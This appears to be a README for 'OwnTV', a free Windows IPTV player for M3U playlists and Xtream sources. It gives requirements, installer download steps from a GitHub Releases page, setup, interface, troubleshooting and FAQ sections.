OwnTV offers a simple way to watch your IPTV content. This player works on your system and helps you organize your video streams. You can use your M3U playlists or connect to Xtream sources through the interface. The software prioritizes speed and ease of use for your daily viewing.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- 4GB of RAM
- Reliable internet connection
- M3U playlist file or Xtream server details

## 📥 Getting Started

Follow these steps to set up the application on your computer.

1. Visit the [official download page](https://github.com/morganaafroasian296/OwnTV).
2. Look for the latest version under the Releases section.
3. Download the installer file ending in .exe to your local drive.
4. Open the downloaded file to begin the installation process.
5. Follow the on-screen prompts to place the software on your system.

## ⚙️ Initial Setup

Once you install the program, you need to add your sources to start watching.

- Open the OwnTV application from your start menu.
- Locate the Settings menu within the dashboard.
- Select the option to Add New Source.
- Choose between M3U File or Xtream Code connection.
- Enter your playlist URL or upload the local M3U file from your hard drive.
- Save your settings to load your channels.

## 🖥️ Using the Interface

The interface uses a simple layout. You navigate using your mouse or keyboard. The main screen shows your available channels once you verify your source.

- Sidebar: Use this area to switch between your uploaded playlists.
- Search Bar: Type part of a channel name here to filter your list.
- Player Window: The video starts automatically when you select a channel.
- Playback Controls: Use the buttons at the bottom to adjust volume, pause, or switch to full-screen mode.

## 📝 Troubleshooting

If you encounter issues, check these common items first.

- Network Connection: Ensure your computer has an active internet connection. IPTV streams require constant bandwidth to maintain a clear picture.
- Playlist Validity: Verify that your M3U file contains active links. Some links break over time.
- Update Software: Periodically check the repository for newer versions. Developers release updates to fix bugs and improve performance.
- Firewall Settings: Ensure your firewall allows OwnTV to access the network. Most Windows systems prompt for permission upon the first launch.

## ❓ Frequently Asked Questions

What happens if a channel does not load?
Check your internet connection first. If the internet works, the specific stream source might be offline. Try selecting a different channel.

Can I move the application window?
Yes, simply drag the top bar of the application window to move it around your desktop.

Does the application save my data?
Your playlist information stays on your local machine. The software does not send your personal source data to external servers.

Is there a cost to use this?
OwnTV is free software. You bring your own sources to play through the interface.

How do I remove the software?
Open your Windows Control Panel, select Programs and Features, find OwnTV in the list, and choose Uninstall. This removes the application and its associated files from your drive.
